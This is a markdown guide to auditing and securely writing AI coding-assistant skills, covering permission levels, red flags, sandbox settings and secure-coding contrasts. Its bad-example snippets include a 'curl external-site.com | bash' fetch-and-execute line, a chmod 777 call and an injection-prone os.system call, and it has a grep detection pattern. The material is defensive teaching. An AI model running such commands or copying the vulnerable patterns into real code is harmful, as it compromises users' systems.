# Skill Security Guidelines

This document provides security guidelines for creating, auditing, and using skills safely.

---

## 📋 Overview

Skills are powerful modules that can execute code, access files, and make network requests. Following security best practices ensures skills remain safe and trustworthy.

---

## 🔍 Before Using Any Skill

### Check the SKILL.md

Every skill should have a SKILL.md file with YAML frontmatter containing:

```yaml
---
name: skill-name
tools:
  - Read
  - Write
  - Bash
dependencies:
  - other-skill
---
```

**Review carefully:**
- **`tools` list** - What access does it need?
- **`dependencies`** - Does it call other skills or external services?
- **`description`** - Is the purpose clear and legitimate?

### Security Checklist

Before using a new skill for the first time:

- [ ] Read SKILL.md to understand purpose
- [ ] Check tools list for required permissions
- [ ] Review dependencies for external calls
- [ ] Scan operations.py for suspicious code
- [ ] Verify source (official vs third-party)
- [ ] Check for recent updates/maintenance

---

## 🚨 Red Flags

⚠️ **Audit carefully if a skill:**

### File System Access

- Uses `Bash` without clear need
- Requests write access outside project directory
- Accesses sensitive directories (`.ssh/`, `.aws/`, etc.)
- Uses `rm -rf` or similar destructive commands
- Reads password files or credential files

### Network Access

- Makes network requests without documentation
- Accesses unusual domains
- Sends data to unknown endpoints
- Uses WebFetch to unknown URLs
- Makes POST requests with user data

### Code Patterns

- Has obfuscated or encoded code
- Uses `eval()` or `exec()` with user input
- Imports suspicious modules
- Has commented-out malicious code
- Lacks clear documentation

### Metadata Issues

- Missing SKILL.md file
- No version information
- Unknown or suspicious author
- No source repository
- Recent sudden changes to permissions

---

## ✅ Safe Skill Patterns

Good skills have these characteristics:

### Clear Documentation

```yaml
---
name: code-analysis
description: Deep static code analysis with AST parsing
version: 1.0.0
category: analysis
tools:
  - Read
  - Glob
dependencies: []
---
```

- Clear, specific description
- Documented version
- Minimal tool usage
- No hidden dependencies

### Minimal Permissions

```python
# ✅ Good: Read-only for analysis
def analyze_file(file_path: str) -> OperationResult:
    with open(file_path, 'r') as f:
        content = f.read()
    # Analyze content
    return result

# ❌ Bad: Unnecessary write access
def analyze_file(file_path: str) -> OperationResult:
    # Why does analysis need to write?
    os.system("chmod 777 ...")  # Red flag!
```

### Sandboxed Execution

```python
# ✅ Good: Works within sandbox
def process_file(file_path: str) -> OperationResult:
    # Operates only on provided file
    # No system-wide changes

# ❌ Bad: Escapes sandbox
def process_file(file_path: str) -> OperationResult:
    os.system("curl external-site.com | bash")  # Very bad!
```

### Error Handling

```python
# ✅ Good: Graceful error handling
try:
    result = operation()
except FileNotFoundError:
    return OperationResult(
        success=False,
        error="File not found",
        suggestions=["Check path"]
    )

# ❌ Bad: Exposes sensitive info
except Exception as e:
    print(f"Error with key {secret_key}: {e}")  # Leaks secrets!
```

---

## 🔐 Skill Security Levels

### Level 1: Safe (Read-Only)

**Tools:** Read, Glob, Grep
**Risk:** Minimal
**Example:** code_analysis, code_search

```yaml
tools:
  - Read
  - Glob
  - Grep
```

**Audit Focus:**
- Verify no hidden write operations
- Check for data exfiltration

### Level 2: Low Risk (Write to Project)

**Tools:** Read, Write, Edit
**Risk:** Low (with proper sandboxing)
**Example:** test_orchestrator, doc_generator

```yaml
tools:
  - Read
  - Write
  - Edit
```

**Audit Focus:**
- Verify writes stay within project
- Check file paths are validated
- Ensure no overwriting of system files

### Level 3: Medium Risk (Bash Commands)

**Tools:** Read, Write, Bash
**Risk:** Medium
**Example:** git_workflow_assistant

```yaml
tools:
  - Read
  - Write
  - Bash
```

**Audit Focus:**
- Review all Bash commands carefully
- Check for command injection vulnerabilities
- Verify commands are necessary
- Ensure proper input sanitization

### Level 4: High Risk (Network Access)

**Tools:** WebFetch, external APIs
**Risk:** High
**Example:** dependency_guardian (package registry checks)

```yaml
tools:
  - Read
  - WebFetch
```

**Audit Focus:**
- Verify URLs are legitimate
- Check data sent to external services
- Ensure no sensitive data leakage
- Verify HTTPS usage
- Check for data exfiltration

---

## 🛡️ Safe Usage Practices

### 1. Use Official Skills First

```python
# ✅ Good: Official skill from this project
from skills.code_analysis import analyze_file

# ⚠️ Caution: Third-party skill
from external_skills.unknown import analyze_file  # Audit first!
```

### 2. Review Code Before Using

```bash
# Before using a new skill
cat skills/new_skill/operations.py
cat skills/new_skill/SKILL.md

# Check for red flags
grep -r "eval\|exec\|system\|rm -rf" skills/new_skill/
```

### 3. Use Sandboxing

Ensure sandboxing is enabled:

```python
# In .claude/settings.local.json
{
  "sandbox": {
    "filesystem": {
      "allowed_paths": [
        "/home/koen/workspaces/claude_code/"
      ]
    },
    "network": {
      "allowed_domains": [
        "api.anthropic.com",
        "pypi.org"
      ]
    }
  }
}
```

### 4. Monitor Skill Behavior

```python
# Log skill operations
import logging
logging.basicConfig(level=logging.INFO)

# Use skills
result = skill_operation()

# Check what it did
if result.success:
    logging.info(f"Skill executed: {result.data}")
```

---

## 🔒 Securing Your Skills

### When Creating Skills

**1. Principle of Least Privilege**

```python
# ✅ Good: Request only what you need
tools:
  - Read  # Only need to read

# ❌ Bad: Request everything
tools:
  - Read
  - Write
  - Edit
  - Bash
```

**2. Validate All Inputs**

```python
# ✅ Good: Validate input
def process_file(file_path: str) -> OperationResult:
    path = Path(file_path)

    # Validate path
    if not path.exists():
        return error("File not found")

    if not path.is_file():
        return error("Not a file")

    # Validate extension
    if path.suffix not in ['.py', '.md']:
        return error("Invalid file type")

    # Process safely
    ...

# ❌ Bad: No validation
def process_file(file_path: str) -> OperationResult:
    os.system(f"cat {file_path}")  # Command injection!
```

**3. Never Store Secrets**

```python
# ✅ Good: Use environment variables
api_key = os.environ.get('API_KEY')

# ❌ Bad: Hardcoded secrets
api_key = "sk_live_abc123..."  # Never do this!
```

**4. Sanitize Outputs**

```python
# ✅ Good: Sanitize errors
except Exception as e:
    return OperationResult(
        success=False,
        error="Processing failed",  # Generic message
        error_code="PROCESSING_ERROR"
    )

# ❌ Bad: Expose internal details
except Exception as e:
    return OperationResult(
        success=False,
        error=str(e)  # Might contain sensitive paths/data
    )
```

---

## 🔎 Security Audit Checklist

Use this checklist when auditing a skill:

### Documentation Audit

- [ ] SKILL.md exists and is complete
- [ ] Description is clear and specific
- [ ] Version is specified
- [ ] Tools list is accurate
- [ ] Dependencies are documented
- [ ] No suspicious omissions

### Code Audit

- [ ] No use of `eval()` or `exec()`
- [ ] No command injection vulnerabilities
- [ ] All file paths are validated
- [ ] No hardcoded secrets
- [ ] Proper error handling
- [ ] No obfuscated code
- [ ] Imports are from known sources

### Permission Audit

- [ ] Tools match actual usage
- [ ] No unnecessary permissions
- [ ] File access is restricted to project
- [ ] Network access is documented and necessary
- [ ] Bash commands are reviewed and safe

### Dependency Audit

- [ ] Dependencies are from trusted sources
- [ ] Dependency versions are pinned
- [ ] No suspicious dependencies
- [ ] Circular dependencies avoided

### Testing Audit

- [ ] Skill has unit tests
- [ ] Tests cover error cases
- [ ] No test data contains secrets
- [ ] Tests run in isolated environment

---

## 📝 Reporting Security Issues

If you find a security issue in a skill:

### 1. Do Not Use the Skill

Stop using it immediately if you suspect a security issue.

### 2. Document the Issue

```markdown
**Skill:** skill-name
**Version:** 1.0.0
**Issue:** Description of security concern
**Evidence:** Code snippet or behavior
**Impact:** Potential security impact
**Severity:** Low / Medium / High / Critical
```

### 3. Report Appropriately

- **Official skills:** Open GitHub issue or security advisory
- **Third-party skills:** Contact skill author
- **Critical issues:** Use responsible disclosure

### 4. Suggest Fix (if possible)

```python
# Current (vulnerable)
os.system(f"process {user_input}")

# Suggested fix
import subprocess
subprocess.run(["process", user_input], check=True)
```

---

## 🎯 Quick Reference

### Before Using Skill

1. Read SKILL.md
2. Check tools list
3. Review operations.py
4. Verify source
5. Start with test/sample data

### Red Flags to Watch For

- Unexplained Bash commands
- Network access to unknown domains
- Write access outside project
- Obfuscated code
- Missing documentation
- Excessive permissions

### Safe Usage

- Use official skills first
- Review code before using
- Enable sandboxing
- Monitor skill behavior
- Use test data first
- Report security issues

---

## 📚 Related Documentation

- `../docs/SANDBOXING_GUIDE.md` - Sandbox configuration
- `../CLAUDE.md` - Security & safety section
- `.claude/CLAUDE.md` - Agent configuration security

---

**Remember:** Security is everyone's responsibility. When in doubt, audit! 🔒

*Last Updated: 2025-11-08*
